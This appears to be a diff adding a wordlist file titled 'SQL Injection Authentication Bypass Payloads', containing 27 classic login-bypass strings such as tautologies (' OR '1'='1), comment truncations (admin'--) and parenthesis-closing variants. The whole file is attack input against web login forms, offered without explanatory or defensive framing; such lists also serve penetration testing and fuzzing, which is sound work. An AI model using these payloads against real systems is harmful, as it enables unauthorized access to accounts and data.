@@ -1,0 +1,28 @@
+# SQL Injection Authentication Bypass Payloads
+' OR '1'='1
+' OR '1'='1'--
+' OR '1'='1'/*
+admin'--
+admin' #
+admin'/*
+' OR 1=1--
+" OR 1=1--
+' OR 1=1#
+" OR 1=1#
+or 1=1--
+' or ''='
+' or 1=1--
+" or ""="
+' or 'x'='x
+') or ('x'='x
+' OR 'a'='a
+') OR ('a'='a
+admin" or "1"="1
+admin") or ("1"="1
+1' or '1'='1
+1 or 1=1
+' OR ''='
+'='
+'=0--+
+' AND id IS NULL; --
+'||(elt(-3+5,1))
